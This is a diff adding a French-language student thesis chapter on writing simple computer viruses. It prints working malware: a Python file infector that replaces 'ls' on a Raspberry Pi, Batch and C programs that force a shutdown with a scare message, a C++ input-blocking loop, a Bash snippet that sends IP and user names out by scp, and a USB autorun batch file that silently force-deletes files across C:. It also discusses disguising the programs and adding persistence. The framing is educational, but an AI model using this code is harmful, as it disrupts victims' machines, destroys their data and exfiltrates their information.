@@ -1,0 +1,401 @@
+\chapter{Les travaux pratiques} \label{chapter:configuration}
+
+Ce chapitre présente essentiellement le travail pratique qui a été réalisé. Les difficultés rencontrées durant ce travail de maturité vont être citées principalement dans la section \textit{Expérimentations}, certaines seront directement mentionnées dans \textit{Codes}, puis seront globalisées dans la \textit{Discussion}. C'est principalement par ses expérimentations que l'on parvient à comprendre le fonctionnement d'un virus.   
+
+\section{Expérimentations}
+
+Le travail pratique qui est expliqué ici me sert à comprendre empiriquement comment fonctionne un virus, et comment -les plus simples d'entre eux- sont codés.
+
+Il est préférable, pour ma compréhension, de commencer à partir d'un virus qui avait été créé par autrui, légèrement le modifier et de l'analyser ensuite; ce qui m'aiderait à savoir comment sont structurés les virus et comment ils fonctionnent. Pour que ce virus fonctionne, l'utilisateur nécessite uniquement d'avoir Python d'installé dans son ordinateur et de lancer le programme.    
+
+Ensuite, j'essaie de créer un virus dans lequel plusieurs messages d'erreur et de terminals apparaissent à l'écran de l'utilisateur lors de l'exécution du programme que j'ai créé. Ensuite, je souhaiterais écrire un message quelconque au moment où l'os indique que "le système va s'éteindre dans moins d'une minute." Ce message sera appelé principalement pour faire peur à la personne qui le lance. -C'est notamment pourquoi j'y écrirai quelque chose de semblable à "tous vos fichiers vont être supprimés !"- Maintenant, dans le virus lui-même, je n'ajouterai absolument aucune suppression de fichiers car ceci est bien trop dangereux à essayer. En effet, il se pourrait que je fasse supprimer, par exemple, l'os de l'ordinateur sans que je ne puisse le récupérer.
+
+Sachant qu'en Batch le virus n'a pas une extension convenable, je décide de reproduire le même en C. Tout devrait ressembler au virus du dessus mis-à-part le message que donne l'os. Je n'ai malheureusement pas réussi à afficher ce que je souhaitais car cela annulait le script qui était au dessus et ne tenait en compte que le message. D'autre part, il m'était venu à l'idée de placer une icône au programme avec l'aide d'un fichier ressources (comme expliqué plus tard dans Codes). Malheureusement, ce fichier ne parvenait pas à trouver l'icône.
+Pour que ces deux virus (tant en Batch que en C) fonctionnent, il faudra soit que le programe ait été installé depuis un courriel, soit lancé depuis une clé usb ou autre périphèrique externe connecté à la machine.     
+
+J'essaie, dans un autre virus, de bloquer les périphèriques qui sont reliés à l'ordinateur avec un code en C++. J'imaginais faire cela en appelant une boucle infinie. Elle empêcherait la console de capter la souris et le clavier, ce qui fait que ceux-ci deviennent inutilisables: le pointeur de la machine ne bouge plus et le clavier ne permet pas de rallumer l'ordinateur avec, par exemple, \textit{Windows + r}, \textit{shutdown /r}. L'utilisateur devrait alors éteindre sa machine d'une manière différente.
+Il y a également des conditions pour que ce virus fonctionne: le télécharger depuis un courriel ou bien le lancer depuis un périphèrique externe. 
+
+%Finalement, je tente de me connecter à un Raspberry Pi avec un Windows via SSH. Je fais parvenir l'adresse IP du Raspberry Pi sur mon ordinateur grâce à une manipulation en Shell. Ensuite, je crée un virus en Python, dans lequel il y aura également du code en Shell. Je transmettrai alors ce virus dans un compte créé au préalable sur le Raspberry et je l'exécuterai. Ce virus devrait être discret et assez complexe à identifier car je pense créer un compte qui a un nom ressemblant à un compte des fichiers Debian.    
+
+Finalement, je tente de me connecter à un Raspberry Pi avec un Windows via ssh. Le processus se passe ainsi: j'envoie un courriel quelconque au Raspberry, la personne le télécharge et l'exécute. Le Raspberry est alors infecté. Là, intervient le premier virus qui va remplacer le ls. Dans ce nouveau ls, j'y intègre une série de codes en Bash, notamment des codes pour obtenir l'adresse ip et le nom d'utilisateur et je les place dans un nouveau fichier en "\textit{.txt}".
+Maintenant, il faut bien entendu que tous deux ordinateurs soient connectés à ssh. Admettons qu'ils le soient; il me suffira donc d'envoyer le document .txt par scp à mon ordinateur Windows. 
+Les conditions ici sont bien plus nombreuses: il faut que l'utilisateur de l'ordinateur qui sera infecté ait Python et ssh d'activé. De plus, il est nécessaire qu'il n'ait pas changé le mot de passe de son Raspberry Pi, qui de base est "Raspberry" ou bien, qu'il l'ait supprimé. Enfin, il faudra profiter de la naïveté de l'utilisateur lorsqu'il installera le document en Python.   
+\section{Résultats\index{version provisoire}}
+
+J'ai donc recréé le virus de \textit{GNU/Linux Magazine France} \citeweb{alivre} \cite{LinuxMag} dans mon Raspberry PI. Ensuite, j'ai étudié le script de la personne et je l'ai modifié afin que le celui-ci soit compatible avec ma machine. Il ne m'a pas fallu faire de grands changements, uniquement de prendre les bons fichiers (ici ls) et mettre le bon utilisateur. 
+ 
+
+\medskip
+
+Vient ensuite le virus en Batch. Le fonctionnement de celui-ci se passe exactement comme voulu sans qu'il n'y ait eu de problèmes majeurs rencontrés. Les images \ref{fig:figgrandetaille1} et \ref{fig:figgrandetaille2} démontrent ce qu'affiche le programme:
+
+\tmfigureB{STOPscreen}{Message Batch}{fig:figgrandetaille1}{Crédit figure grande taille \protect\url{Capture Personelle}}
+\medskip
+
+\tmfigureB{ERRORscreen}{Batch}{fig:figgrandetaille2}{Crédit figure grande taille \protect\url{Capture Personelle}}
+\medskip
+
+J'ai ensuite retranscrit ce script en C, afin d'avoir un exécutable et non pas un fichier \textit{.bat}. Tout fonctionne comme souhaité mis à part le message écrit que l'on peut voir sur la figure \ref{fig:figgrandetaille1}. Autrement, aucun problème n'a été dérangeant, j'ai simplement pris plus de temps à faire ceci en C car je n'avais aucune connaisance avec ce langage. Les images \ref{fig:figgrandetaille3} et \ref{fig:figgrandetaille4} montrent le virus exécutable créé en C.
+
+\tmfigureB{screenSTOP}{Message C}{fig:figgrandetaille3}{Crédit figure grande taille \protect\url{Capture Personelle}}
+
+\tmfigureB{screenERROR}{C}{fig:figgrandetaille4}{Crédit figure grande taille \protect\url{Capture Personelle}}
+
+
+\medskip
+
+Pour ce qui est du virus qui bloque les périphèriques, tout se passe comme prévu tant que l'antivirus est désactivé et que l'on lance l'exécutable en mode administrateur. Son code n'est pas très complexe et le programme est plaisant à faire essayer à un ami car celui-ci ne comprend pas ce qui se passe avec sa souris et son clavier.
+
+\medskip
+
+%a tentative de connection par ssh se fait assez facilement. Ici, je vais essayer de créer un nouvel utilisateur dans le Raspberry Pi depuis un autre ordinateur. 
+%Premièrement, je récupère l'adresse ip du Raspberry Pi et l'envoie sur l'ordinateur qui est sous Windows. Grâce à celà, je peux me connecter par ssh. Je crée ensuite un nouvel utilisateur dont je choisis le mot de passe et ensuite, je crée un virus ou programme que je cache dans le nouvel utilisateur que je viens de créer. La personne qui possède la Raspberry Pi ne verra sans doute pas directement qu'un nouvel utilisateur a été créé. Par la suite, je pourrai lancer ce virus depuis mon ordinateur sous Windows à tout moment et en toute discretion.
+ 
+\medskip
+
+Le virus qui supprime tout dossier avec l'extension voulue fonctionne parfaitement tant que ceux-ci soient bien placés dans le disque local "C:". Il m'a été malheureusement impossible d'essayer l'autorun car je n'ai pas trouvé d'ordinateur fonctionnant sur une version précédant Windows 7. Il m'est néanmoins venu à l'idée d'installer une machine virtuelle, mais je ne possédais pas d'image ISO de Windows XP, ce qui m'empêchait de tester le virus avec toutes ses capacités.   
+
+
+\section{Codes}
+
+Le code du virus en Python basé du magazine \textit{GNU/Linux Magazine France} est configuré en deux parties. Celles-ci sont divisées dans cette section et commentées. La première partie est placée dans le Listing 2.1 et la deuxième se trouve dans le Listing 2.2.
+
+\begin{lstlisting}[caption={Virus Raspberry Pi},label={listing:Python}]
+#!/usr/bin/python3
+# _*_ coding: Utf-8 _*_
+
+#=== INFECTED ===
+'''
+Programme virus infectant le dossier "ls"
+- Fonctions
+    IsInfected
+    bomb
+- Variables
+    fileToCorrupt
+    filenames
+    ftcLines
+    originalFile
+    pathToCorrupt
+'''
+
+import os
+import os.path
+from sys import argv                               
+import shutil
+import stat 
+import random
+
+cmd_init, cmd = ('ls','ls')
+pathToCorrupt = '/home/pi/my_bin/'
+fileToCorrupt = pathToCorrupt + cmd
+
+def IsInfected(content):
+    return content == b'# ===INFECTED===\n'
+         
+def bomb():
+    print('INFECTÉ')
+
+
+with open(fileToCorrupt, 'rb') as currentFile:
+    ftcLines = currentFile.readlines()
+    if IsInfected(ftcLines[1]):
+        filenames = os,listdir(pathToCorrupt)
+        random.shuffle(filenames)                           
+        for cmd in filenames:
+            if cmd != cmd_init and cmd[0] != '.':
+                with open(pathToCorrupt + cmd, 'rb') as newFile:
+                    ftcLines = newFile.readlines()
+                    if not IsInfected(ftcLines[1]):
+                        fileToCorrupt = pathToCorrupt + cmd
+                        break
+                    else:
+                        print('All files already corrupted')       
+                        exit(0)
+
+       
+#Début de l'infection
+try:
+    print('Infection in progress: command', cmd)
+    originalFile = pathToCorrupt + '.'+  cmd
+    shutil.move(fileToCorrupt, originalFile)
+    shutil.copyfile(argv[0], fileToCorrupt)
+    os.chmod(fileToCorrupt, stat.S_IXUSR| stat.S_IRUSR| stat.S_IWUSR| stat.S_IXGRP| stat.S_IROTH| stat.S_IWOTH| stat.S_IXOTH| stat.S_IROTH| stat.S_IWOTH)
+except:
+    #Problème lors de l'infection, on restitue les données initiales
+    shutil.move(originalFile,fileToCorrupt)
+    exit(1)
+    
+    
+#Bombe logique
+bomb()
+\end{lstlisting}
+
+\medskip
+\medskip
+
+On importe les modules nécessaires au fonctionnement du virus. Ensuite on définit quelle commande va être infectée, quel chemin on va prendre pour réussir l'infection puis le nom du fichier.
+\medskip
+Dès lors, on appelle deux fonctions qui sont \textit{isInfected()} et \textit{bomb()}. La première est travaillée en \textit{bytes} car il se peut que certains fichiers ne soient pas simplement des fichiers textes. Son but est d'analyser si les dossiers voulus ont déjà été infectés.
+La deuxième est une bombe logique. Dans ce cas de figure, j'ai décidé d'écrire le message "INFECTÉ".
+Suite à cela, le programme vérifie si le fichier est déjà infecté ou non. S'il est déjà infecté, on mélange les dossiers avec filenames et on \textit{random.shuffle()} afin d'avoir un mélange totalement aléatoire jusqu'au moment où il trouve un fichier non infecté qui ne commence pas par un point(car ceux qui commencent par un point sont ceux que crée le virus).  S'il ne l'est pas, on passe directement au début de l'infection. 
+C'est dès ce moment \textit{(Début de l'infection)} que l'on renomme le fichier avec un point au début. Ensuite, on place le "faux-fichier" qui n'a pas de point en préfixe comme original, puis, on lui donne un maximum d'autorisations pour qu'il ressemble au fichier qu'on a renommé et caché. Enfin, il suffit de lancer la bombe logique.
+
+
+\begin{lstlisting}[caption={Virus Raspberry PI suite},label={listing:Python}]
+# === ORIGINAL ===
+#Exécution du code original
+try:
+    if argv[0] != './PasDangereux.py':
+        os.system('.' + os.path.basename(argv[0]) + '.' + ' '.join(argv[1:])) 
+except:
+    exit(2)   
+\end{lstlisting} 
+\medskip
+\medskip
+Maintenant, on essaie le programme. On évite de mettre le nom du fichier afin de ne pas créer une boucle infinie. Finalement, on met les erreurs possibles sous silence et il ne reste plus qu'à exécuter le programme.
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Mise en place ".bat"},label={listing:Batch}]
+@echo off
+color 04
+chcp 28591 > nul
+\end{lstlisting}
+
+
+Le \textit{@echo off} permet de cacher l'exécution de la commande en cours dans le terminal. Suite à cela, vient le choix de la couleur -dans ce cas,  rouge- qui apparaîtra dans les indications de la base de données. \textit{chcp 28591 > nul} est ajouté au programme afin de donner accès aux caractères spéciaux lors de l'apparition d'un message en langage Batch. Sans cette consigne, le code ne fonctionnera pas ou n'affichera pas ce qui était demandé. 
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Corps du programme ".bat"},label={listing:Batch}]
+shutdown -s -t 30 -c "Ne soyez pas naïf, cessez de faire confiance à n'importe qui. Tous vos fichiers vont être supprimés à jamais."
+start cmd
+start ERROR
+\end{lstlisting}
+
+Ci-dessus, on distingue le \textit{shutdown -s} qui fait éteindre l'ordinateur (\textit{-r} le reboot et \textit{-h} le met en veille prolongée), le \textit{-t 30} symbolisant le temps que va prendre l'appareil à exécuter le type de shutdown et le \textit{-c "..."} permettant d'écrire un commentaire. Ensuite, on appelle le \textit{cmd} autant de fois que souhaité et on recherche le programme \textit{ERROR} qui peut s'appeler de quelconque manière, il faut simplement que celui-ci ne puisse être trouvé par le terminal. Ce programme ERROR n'éxiste pas, le terminal affiche simplement des messages signalant qu'il ne parvient pas à le trouver. Et donc, une quantité de messages choisie au préalable rend l'utilisation de la machine bien plus contraignante. Plus il y a de messages, plus de fenêtres devront être supprimées. ERROR intrigue l'utilisateur, il est préférable de rechercher un programme nommé ainsi qu'un autre avec un nom qui puisse paraître moins crédible.   
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Mise en place ".c"},label={listing:C}]
+#include <stdio.h>		//Directive
+#include <stdlib.h>		//Directive
+\end{lstlisting}
+
+Pour le langage C, il faut tout d'abord inclure les librairies nécessaires au script.
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Corps du programme ".c"},label={listing:C}]
+int main()										//fonction
+
+{
+	//Startinstructions
+	
+	
+	//instruction arrêt 				
+	system("c:\\windows\\system32\\shutdown /s /t 30");			
+	
+	system("start cmd.exe");
+	system("start ERROR");
+	return 0;		
+										
+	//EndInstructions
+	
+}
+
+\end{lstlisting}
+
+
+On défini la fonction, puis on commence les instructions. Il faudra mettre le cheminement vers le \textit{shutdown} de l'ordinateur puis, tout comme en batch, chosir son type. Cette fois-ci, il faut employer "\textit{/s}" au lieu de "\textit{-s}" ainsi que pour tout autre paramètre à appliquer au shutdown.
+Suivent les messages d'erreur et de fichier non-trouvé à mettre autant de fois que voulu.(Attention à ne pas oublier les parenthèses et le "\textit{;}") 
+On retourne ce que le programme va nous donner, puis il ne reste plus qu'à compiler le tout. Un dossier dans lequel un fichier en "\textit{.o}" apparaîtra et un exécutable en "\textit{.exe}" sera créé. C'est dans ce dernier où il sera possible de trouver l'application en \textit{.exe} qui permet la lecture et l'exécution du programme.
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Crash périphèriques},label={listing:C++}]
+#include <windows.h>
+#include <winable.h>
+
+using namespace std;
+
+int main(){
+
+    FreeConsole();
+    while(1){
+        BlockInput(true);   /* on bloque les entrées//*/
+    }
+}
+\end{lstlisting}
+
+
+On inclut les librairies nécessaires, ici de Windows grâce aux \textit{include <...>}. Suite à cela, on utilise l'espace de nom \textit{std} qui est celui par défaut de C++. On définit alors la fonction \textit{main}, puis on appelle la fonction de Windows qui libère la console avec un \textit{FreeConsole();}. On démarre ensuite une boucle infinie avec \textit{while(1)}. Dans cette boucle, on ajoute un blocage des entrées des périphèriques externes grâce au \textit{BlockInput(true);}, on referme les crochets puis on compile le code. C'est alors au moment de l'exécution du programme que celui-ci va démarrer. Le clavier et la souris deviennent alors inutilisables; ceci peut être dérangeant si l'utilisateur travaillait sur un projet sans qu'il n'ait sauvegardé par exemple. 
+
+\medskip
+
+Comment faire pour pouvoir reprendre le contrôle de ses périphèriques? Simplement en éteignant l'ordinateur par le bouton ON/OFF ou par l'alimentation. D'autre part, nous pouvons également l'éteindre avec le clavier malgré qu'il ne fonctionne pas. Il suffit de faire Ctrl+Alt+Delete, un blue screen apparaîtra et nous pourrons enclencher l'arrêt de la machine grâce aux touches directionnelles. 
+Ce programme ne peut malheureusement pas s'enclencher de la manière voulue lorsqu'un antivirus est activé car celui-ci détecte qu'une menace peut exister. Il faut alors pour l'expérimenter, désactiver son pare-feu pendant un certain temps.
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Empêcher l'arrêt du système ".c"},label={listing:C}]
+#include <stdio.h>		//Directive
+#include <stdlib.h>		//Directive
+
+int main()
+
+{
+	system("c:\\windows\\system32\\shutdown /a");
+	return 0;
+}
+\end{lstlisting}
+
+
+Afin d'éviter de rallumer mon ordinateur à chaque essai des codes ci-dessus, j'ai simplement écrit ce qu'il y a au Listing 2.8, qui grâce au \textit{shutdown /a}, va annuler l'arrêt de la machine. Ce qui est bien plus pratique pour continuer à avancer dans le script.
+\medskip
+
+Le code peut également être écrit en Batch (toujours en cachant son exécution grâce au \textit{echo off}, et à l'annulation du shutdown avec \textit{-a})de la manière qui suit:
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Empêcher l'arrêt du système ".bat"},label={listing:Batch}]
+@echo off
+shutdown -a
+\end{lstlisting}
+
+\medskip
+\medskip
+
+
+Pour l'infection qui concluait par une connection ssh, il me fallait continuer le script du Listing 2.1.
+ 
+\begin{lstlisting}[caption={suite bomb()},label={listing:Python}]
+fichier = open("ls", "w")
+fichier.write("#!/bin/bash 
+ls -la 
+ip addr > .addresse.txt 
+users >> .addresse.txt 
+scp -p .addresse.txt utilisateur@adresse ")
+fichier.close()
+\end{lstlisting}
+
+Le but était de créer un script Bash qui peut être lancé dans la console. Dans ce script Bash, je demande à ce que l'ordinateur mette l'addresse ip de l'utilisateur et son nom d'utilisateur dans un document qui s'appelle \textit{.addresse.txt}. Pour que finalement, ce document me soit envoyé par scp sur une autre machine. 
+Je ne suis malheureusement pas parvenu à le faire; lorsque je lançais un ls dans le terminal, il ne lisait pas le nouveau fichier remplacé, mais bien la liste des fichiers. Le nouveau document ne se créait pas et donc le transfert de documents ne s'est pas déroulé.   
+
+
+%J'ai premièrement installé ssh sur mon Raspberry Pi. J'ordonne ensuite de commencer les services ssh, puis, je me connecte à la machine que je veux infecter grâce à son nom d'utilisateur et son adresse ip. Suite à la connection, j'ajoute un utilisateur. \textit{-p} sert à définir le mot de passe. La dernière commande peut être écrite dans le script en Shell ou bien dans le programme en Python qui suit.  
+
+\medskip
+\medskip
+
+%\begin{lstlisting}[caption={Script pour ssh},label={listing:Python}]
+%#-*- coding: Utf-8 -*-		
+
+%import os
+%'''
+%import commands
+%u=commands.getoutput('\textit{sudo useradd nom -p MotDePasse}')
+%u=commands.getoutput('shutdown -h now')
+%'''
+
+%os.system('firefox')					#nombre de fois voulu
+
+%os.system('terminator')					#nombre de fois voulu
+%\end{lstlisting}
+
+\medskip
+\medskip
+ 
+%Suite à la connection, je crée un programme que j'enverrai ensuite sur le Raspberry Pi par scp. Dans celui ci-dessus, j'ai trouvé, sur les différents forums de Raspberry, deux manières d'écrire en Bash sur Python. Premièrement, une manière moins connue, en important \textit{commands} qui grâce à \textit{u=commands.getoutput('')} peut permettre d'écrire en Shell. Mais cette notion, ne fonctionne pas avec tout script. C'est pourquoi je suis allé dans la simplicité en important l'os et en écrivant \textit{os.system('')}. Je ne parvenais pas à créer un virus dans ce langage, j'ai donc tenté de "crasher" l'ordinateur en lançant, comme le virus Melissa, une série de pages internet. J'y ai également ajouté un grande quantité de Terminator.
+%Toujours en Python et sur ce code, j'ai essayé d'appeler deux fonctions dans lesquelles j'ajoutais chacunes des lignes commençant par \textit{os.system} dans une boucle \textit{while}. Malheureusement, le terminal m'indiquait une erreur de syntaxe lorsque je demandais à ouvrir Firefox. Suite à cela, il me suffit de transférer ce fichier sur le nouveau compte du Raspberry Pi créé au préalable via scp et de l'activer à tout moment. Ce code peut être mis dans la startup de Raspbian en ajoutant quelques lignes de code supplémentaires mais ceci ne peut être mis dans Python car il y a une sécurité contre les programmes valveillants. Malgré tout le code est le suivant:
+
+\medskip
+\medskip
+
+%\begin{lstlisting}[caption={ssh},label={listing:Bash}]
+%sudo nano NomDuScript
+%sudo nano .bashrc
+%\end{lstlisting} 
+
+\medskip
+\medskip
+
+%Il suffit de placer le nom du fichier, valider avec un Ctrl+X, Enter, puis, écrire la deuxième ligne de code. Enfin, il faudra scroll avec sa souris jusqu'en bas et écrire le chemin vers le fichier.
+
+J'étais alors mécontent du résultat obtenu avec le trasfert via ssh, je me suis donc penché vers un virus un peu plus dangereux mais qui reste inoffensif avec les fichiers vitaux d'un ordinateur. Je n'avais pas pour objectif de la faire mais j'imaginais mettre un virus sur une clé USB. Clé USB qui fonctionne grâce à un programme que je crée fonctionnant avec \textit{Autorun}. Autorun est une fonction qui lance directement un programme que l'on peut choisir suite au formatage d'un périphèrique externe.   
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Virus Autorun},label={listing:Batch}]
+C:
+cd \
+del /s /q /f *.extension
+\end{lstlisting} 
+
+\medskip
+\medskip
+
+Ce virus supprimera tous les dossiers -qui comportent l'extension donnée- dont l'utilisateur a accès. \textit{C:} montre que l'on veut aller dans le disque local principal. On rentre ensuite dans le cd et on ordonne la suppression des fichiers voulus.
+\textit{/s} est la commande qui donne accès aux fichiers système. \textit{/q} est la commande "silence", signifiant quiet en anglais. Avec celle-ci, le programme ne demandera pas de confirmer la suppression des fichiers. \textit{/f} forcera le système à supprimmer les dossiers. l'\textit{*} signifie "tous les fichiers". On va donc forcer la machine à supprimer tous les fichiers système possédant une extension particulière se trouvant dans le disque local C:, en mode silence.
+Il manque maintenant de l'enregistrer en tant que fichier de commande .bat et de créer un programme qui permettra d'enclencher notre virus lorsqu'on connecte notre clé USB à l'ordinateur. 
+
+\medskip
+\medskip
+
+\begin{lstlisting}[caption={Autorun},label={listing:Batch}]
+[autorun]
+open=NomDuVirus.bat
+\end{lstlisting}     
+
+\medskip
+\medskip
+
+Pour ce dernier Listing, on appelle l'exécution automatique. Cette exécution ouvrira notre virus suite au formatage de clé. Il ne reste plus qu'à enregistrer en tant que \textit{autorun.inf} et de l'ajouter dans le périphérique où se trouve le virus. \citeweb{bCommentcamarche}
+L'unique point négatif de ce virus est le fait que la fonction autorun ne soit disponible uniquement que sur tout Windows inférieur au 7 car les développeurs de l'os ont remarqué que l'autorun pourrait être sujet à des nombreux malwares. Depuis Windows 7, tous les ordinateurs sont configurés de manière à ouvrir le dossiers des clés et d'afficher les fichiers de celle-ci.
+    
+\section{Discussion}
+Les expériences des travaux pratiques ont été bénéfiques pour la compréhension du sujet de ce travail de maturité. Les méthodes qui ont été employées sont basiques mais suffisament intéressantes pour comprendre ce que l'on fait. Malgré tout, j'ai rencontré certains problèmes minimes mais assez récurents lors de ces expérimentations: 
+\begin{enumerate}
+
+\item les différents problèmes sont plutôt arrivés au début du travail. Notamment avec la source du virus en Python. Car dans celle-ci, il y avait quelques erreurs dans le code: plusieurs bouts de script étaient attachés au mauvais blocs. Ce qui rendait l'exécution du programme impossible.  
+
+\item lors de l'installation de Code::Blocks sur Windows, il y avait quelques problèmes de compatibilité avec les pilotes. J'ai donc essayé avec Microsoft Visual Studios, cependant, je ne réussissais pas à m'habituer à l'interface de cet éditeur. C'est pourquoi je suis retourné à la première option malgré que j'aie perdu énormement de temps à mettre tout en ordre pour un simple éditeur/compilateur.
+
+\item les certaines erreurs de compilation dûes au peu de connaisances sur des langages tels que C et C++. En effet, lors des compilations, certaines alertes de mauvaise syntaxe apparaissaient car pour une grande majorité des fois, le script nécessitait un ";" suite à l'appel d'une fonction. Signe que je confondais avec ":", qui est dédié à Python.
+
+\item le manque d'informations en ligne qui pourraient être utiles à développer d'avantage les virus. Malgré des nombreuses recherches, je ne trouvais pas certaines informations telles que l'application d'une icône, l'implémentation dans la startup ou un mode de réplication qui puisse être formé avec les adresses mail.     
+\end{enumerate}
+
+\medskip
+
+La majorité des virus créés dans le monde sont codés de manière à ce qu'ils soient implémentés dans la startup de l'os de l'ordinateur infecté. Ce qui fait qu'à chaque démarrage, le virus se lance. Pour les expérimentations que j'ai faites, aucune n'a été programmée afin de parvenir à de telles fins car je jugeais que cela pourrait drastiquement ralentir un ordinateur ou l'endommager. De plus, je ne parvenais pas à le faire en langages C/C++. Pour le virus qui bloque les périphèriques, l'insérer dans la startup pourrait être dangereux car il serait d'autant plus difficle de le retirer de l'ordinateur dû au fait qu'il n'ait pas d'antivirus et que le mode sans échec soit difficile à appeler sans clavier. Pour le langage Batch, il n'est pas très compliqué de trouver les informations, notamment sur la toile. Souvent dû à la facilité de programmation de ce langage. Ce sont donc ces améliorations qui seront traîtées dans la section suivante.
+
+
+
+    
+\section{Améliorations possibles}
+
+Il est extrêmement difficile de créer un programme qui ressemble comme deux gouttes d'eau à celui d'un organisme officiel. Pour les créations vues dans les codes ci-dessus, plusieurs améliorations sont possibles. Il est évident que celles-ci peuvent rendre la tâche plus rude à l'utilisateur de l'orinateur infecté.
+
+Le programme en Batch n'a aucunement l'apparence d'un programme digne de confiance; on le remarque assez rapidement dû à son extension. Ce qui serait plus préférable, serait un programme exécutable avec une extension comme ".exe" ou ".com". Malheureusement, je n'ai pas trouvé d'applications qui puissent le faire. Il aurait été judicieux de faire comme le virus I Love You, en changeant l'extension du fichier. Cependant, il n'a pas été créé en Batch, mais bien en Visual Basic Script, langage qui permet plus facilement de camoufler son extension.
+
+Afin de combler ce problème, j'ai décidé de créer le même document, avec une structure quasiment identique, avec un autre langage, \textit{C}. Celui-ci, lors de la compilation du script fini, laisse un fichier texte en "\textit{.C}" et crée un un document en "\textit{.exe}". 
+Très bien ! Le virus paraît être un programme sécurisé !
+Et bien, non. L'icône representé sur celui-ci est celui par défaut, choisi par l'os où est créé le programme. Pour y remédier, j'ai copié le script mais, cette fois-ci, sur \textit{C++}. J'ai longuement cherché comment insérer une icône lors de la compilation pour qu'il soit affiché dans les gestionnaires de fichier, puis j'ai essayé avec un nouveau fichier "ressources" finissant par "\textit{.rc}". Malheureusement, lors de la compilation, l'icône n'apparaîssait pas du tout dans le programme, l'icône restait la même à celle par défaut de Windows et le fichier dans lequel se trouve dans le code reste sans changements. Il aurait paru bien plus réel et de confiance avec une icône.
+
+La dernière manipulation permettant à ce virus d'être plus contraignant serait d'implémenter le programme dans la \textit{startup} de l'os de l'ordinateur infecté, dans ce cas, de Windows. Ce qui enclancherait le programme dès le lancement de la machine, ferait apparaître les messages d'erreur et de fichier non-trouvé pour que finalement, elle s'éteigne au bout de 30 secondes. Ceci bien sûr à chaque démarrage du système. une grande majorité des virus y sont installés, c'est sans doute ce qui empêche l'utilisation sans problèmes des ordinateurs.         
+
+Pour le virus qui sert de crash des périphèriques, il faudrait si possible, bloquer toutes les touches de celui-ci, pour que la seule altérnative pour l'utilisateur soit d'éteindre l'ordinateur par le bouton ON/OFF ou par le câble d'alimentation. Comme tout autre virus, il serait préférable de l'implémenter dans la startup de la machine. Ceci serait bien plus dérangeant car effacer ce virus serait complexe pour une personne qui ne connaît pas bien comment se débarasser d'un programme de ce genre.
+%\begin{lstlisting}[float,caption={L'option %draft},label={listing:optiondraft}]
+%\documentclass[12pt,a4paper,idxtotoc,bibtotoc,francais,titlepage,twoside,openright,draft]%{book}
+%%\documentclass[12pt,a4paper,idxtotoc,bibtotoc,francais,titlepage,twoside,openright]%{book}
+%\end{lstlisting}
